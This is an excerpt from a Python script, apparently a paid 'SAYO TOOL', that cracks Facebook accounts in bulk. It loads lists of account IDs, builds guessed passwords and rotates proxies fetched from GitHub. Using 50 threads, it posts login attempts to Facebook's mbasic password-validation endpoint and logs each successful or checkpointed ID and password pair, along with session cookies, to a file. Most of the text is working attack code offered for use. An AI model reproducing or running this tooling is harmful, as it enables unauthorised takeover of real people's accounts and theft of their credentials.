...
import datetime
import time
sys.stdout.write('\x1b]2; 𝗦𝗔𝗬𝗢 𝗧𝗢𝗢𝗟 \x07')
r = '\033[1;31m'
w = '\x1b[1;97m'
gre = '\x1b[1;32m'
y = '\x1b[1;33m'
blu = '\x1b[1;34m'
sma = '\x1b[1;96m'
lon = random.choice([r,w,gre,y,blu,sma])
...
{gre}━━━━━━━━━━━━━━━━━━━━━━{w}𝗦𝗔𝗬𝗢{gre}━━━━━━━━━━━━━━━━━━━━━
{w}╰ 厄 ⸔⸕ ⫷𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 {w}   ✜ {r}𝗦𝗔𝗬𝗢⫸      
{w}╰ 厄 ⸔⸕ ⫷𝗧𝗘𝗟𝗘 𝗨𝗦𝗘𝗥 {w}   ✜ {r}@𝗦_𝗔_𝗬_𝗢⫸     
{w}╰ 厄 ⸔⸕ ⫷𝗧𝗢𝗢𝗟 𝗧𝗬𝗣𝗘 {w}   ✜ {r}𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞⫸
{w}╰ 厄 ⸔⸕ ⫷𝗧𝗢𝗢𝗟 {w}        ✜ {r}𝗣𝗔𝗜𝗗⫸
{w}╰ 厄 ⸔⸕ ⫷𝗩𝗘𝗥𝗦𝗜𝗢𝗡 {w}     ✜ {r}𝗩𝟮.𝟮                   
{gre}━━━━━━━━━━━━━━━━━━━━━━{w}𝗦𝗔𝗬𝗢{gre}━━━━━━━━━━━━━━━━━━━━━""")
def syline():
...
def check_activation_code(user_code, activation_codes):
    ...
    if user_code in activation_codes:
        ...
        if current_time >= expiration_time:
            syline()
            print(f"{r}𝐄{w}𝐗{r}𝐏{w}𝐈{r}𝐑{w}𝐄{r}𝐃 {w}𝐂{r}𝐎{w}𝐃{r}𝐄 🕘")
            ...
            syline()
            print(f"{r}𝐖{w}𝐎{r}𝐑{w}𝐊{r}𝐈{w}𝐍{r}𝐆 {w}𝐂{r}𝐎{r}𝐃{w}𝐄 ✅😁")
        ...
        syline()
        print(f"{r}𝐈{w}𝐍{r}𝐕{w}𝐀{r}𝐋{w}𝐈{r}𝐃 {w}𝐂{r}𝐎{w}𝐃{r}𝐄 ❌")
...
def creat():
    if len(idg)==15:
        if idg[:10] in ['1000000000']       :creatdate = '2009' 
        elif idg[:9] in ['100000000']       :creatdate = '2009' 
        elif idg[:8] in ['10000000']        :creatdate = '2009' 
        elif idg[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creatdate = '2009' 
        elif idg[:7] in ['1000006','1000007','1000008','1000009']:creatdate = '2010' 
        elif idg[:6] in ['100001']          :creatdate = '2010-2011'
        elif idg[:6] in ['100002','100003'] :creatdate = '2011-2012'
        elif idg[:6] in ['100004']          :creatdate = '2012-2013'
        elif idg[:6] in ['100005','100006'] :creatdate = '2013-2014'
        elif idg[:6] in ['100007','100008'] :creatdate = '2014-2015'
        elif idg[:6] in ['100009']          :creatdate = '2015' 
        elif idg[:5] in ['10001']           :creatdate = '2015-2016'
        elif idg[:5] in ['10002']           :creatdate = '2016-2017'
        elif idg[:5] in ['10003']           :creatdate = '2018-2019'
        elif idg[:5] in ['10004']           :creatdate = '2019-2020'
        elif idg[:5] in ['10005']           :creatdate = '2020' 
        elif idg[:5] in ['10006','10007','']:creatdate = '2021' 
        elif idg[:5] in ['10008']           :creatdate = '2022' 
        elif idg[:5] in ['10009']           :creatdate = '2022' 
        elif idg[:4] in ['6155']           :creatdate = '2023'        
        else:creatdate=''
    elif len(idg) in [9,10]:
        creatdate = '2008-2009'
    elif len(idg)==8:
        creatdate = '2007-2008'
    elif len(idg)==7:
...
while True:
    try:
        ...
        open('.SAYO_PROXY.txt', 'w').write(prox)
        break
    except Exception as e:
...
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/fuck-boy-alam-vau-tera-papa/PROXY-List/master/http.txt').text
        open('.SAYO_PROXY.txt', 'w').write(prox)
        break
    except Exception as e:
        zone("wait for internet......")
...
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/fuck-boy-alam-vau-tera-papa/PROXY-List/master/socks4.txt').text
        open('.SAYO_PROXY.txt', 'w').write(prox)
        break
    except Exception as e:
        zone("wait for internet......")
...
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/fuck-boy-alam-vau-tera-papa/PROXY-List/master/socks5.txt').text
        open('.SAYO_PROXY.txt', 'w').write(prox)
        break
    except Exception as e:
        zone("wait for internet......")
        
prox=open('.SAYO_PROXY.txt','r').read().splitlines()
...
def menu():
        ...
        try:
                ...
                sj="server on"
                if "server on" in sj:
                        print(f'{y}[{w}1{y}] {gre}𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚\n{y}[{w}2{y}] {gre}𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥')
                        syline()
                        mlo=input(f'\x1b[1;97m𝗖𝗛𝗢𝗜𝗦𝗘 : {blu}')
                        if mlo in ['1','01']:
                               
                                clear()
                                file = input(f'{w}𝗙𝗜𝗟𝗘 𝗣𝗔𝗧𝗛 :{blu} ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('𝗙𝗜𝗟𝗘 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗')
                                        time.sleep(1)
                                        menu()
                                ...
                                plist = []
                                syline()
                                print(f'{y}[{w}1{y}] {blu}𝗦𝗧𝗥𝗢𝗡𝗚 𝗣𝗔𝗦𝗦 [𝗦𝗣𝗘𝗘𝗗]\n{y}[{w}2{y}] {gre}𝗠𝗘𝗗𝗜𝗨𝗠 𝗣𝗔𝗦𝗦 [𝗩𝗘𝗥𝗬 𝗦𝗣𝗘𝗘𝗗]\n{y}[{w}3{y}] {y}𝗠𝗜𝗫 𝗣𝗔𝗦𝗦 [𝗦𝗟𝗢𝗪]\n{y}[{w}4{y}] {r}𝗔𝗗𝗗 𝗣𝗔𝗦𝗦\n{y}[{w}5{y}] {sma}𝗟𝗘𝗧𝗧𝗘𝗥𝗦 {w}+ {y}𝗡𝗨𝗠𝗕𝗘𝗥𝗦 [𝗦𝗣𝗘𝗘𝗗]');syline()
                                ppp=input(f'{w}𝗖𝗛𝗢𝗜𝗦𝗘 : {blu}')
                                if ppp in ['1','01']:
                                    ...
                                    plist.append('mnbvmnbv')
                                        ...
                                        try:
                                                syline()
                                                ps_limit = int(input('𝗛𝗢𝗪 𝗠𝗔𝗡𝗬 𝗣𝗔𝗦𝗦 𝗧𝗢 𝗔𝗗𝗗 ? : '))
                                        except:
                                                ps_limit =1
                                        syline()
                                ...
                                with tred(max_workers=50) as crack_submit:
                                        clear()
                                        total_idg = str(len(fo))
                                        qaj=int(total_idg)
                                        print(f'{w}𝗬𝗢𝗨𝗥 𝗙𝗜𝗟𝗘 : {r}{file}')
                                        syline()
                                        for user in fo:
                                                idg,names = user.split('|')
                                                psw = plist
                                                if METHODE in ['1','01']:
                                                        crack_submit.submit(ffb,idg,names,psw)


                                print('𝗧𝗛𝗘 𝗖𝗥𝗔𝗖𝗞 𝗜𝗦 𝗖𝗢𝗠𝗣𝗟𝗘𝗧......')

                                syline()
                                print('\x1b[1;97m𝗖𝗔𝗧𝗖𝗛 \033[2;32m𝗢𝗞 \x1b[1;97m| \033[1;31m𝗖𝗣 \x1b[1;97m:\033[2;32m '+str(len(OK))+' \x1b[1;97m|\033[1;31m '+str(len(CP)))
                                syline()
                        elif mlo in ['2','02']:
                                toasl()
                ...
                print('\n internet is slow')
                exit()              
def ffb(idg,names,psw):
        global adad,OK,CP,qaj
        sys.stdout.write(f'\r\r{r}[{gre}𝗦𝗔𝗬𝗢{r}] {w}- {blu}[{w}{adad}/{qaj}{blu}] {w}- {blu}[{gre}𝗢𝗞{w} : {len(OK)}{blu}] {w}- {sma}[\x1b[38;5;208m𝗖𝗣 {w}: \x1b[38;5;208m{len(CP)}{sma}]');sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idg}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":idg,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ssayo=str(session.cookies)
                        if "c_user" in ssayo:
                                print(f'''\n{gre} -𝙉𝙀𝙒 𝙊𝙆
 ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
 -𝙀𝙈𝘼𝙄𝙇 : {idg}
 ...
 -𝘽𝙔 ➽ @S_A_Y_O'''
                                ...
                                open('/sdcard/𝗦𝗔𝗬𝗢_𝗖𝗔𝗧𝗖𝗛.txt', 'a').write(idg + '|' + pas + '\n')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                OK.append(idg)
                                break
                        elif 'checkpoint' in ssayo:
                                if 'y' in pcp:
                                        print(f'''\n\x1b[38;5;208m -𝙉𝙀𝙒 𝘾𝙋
 ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
 -𝙀𝙈𝘼𝙄𝙇 : {idg}
 ▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
 -𝙋𝘼𝙎𝙎  : {pas}
 ...
 -𝘽𝙔 ➽ @S_A_Y_O'''
                                        ...
                                        open('/sdcard𝗦𝗔𝗬𝗢_𝗖𝗔𝗧𝗖𝗛.txt', 'a').write(idg + '|' + pas + '\n')
                                        CP.append(idg)
                                        break
                                else:
                                        break
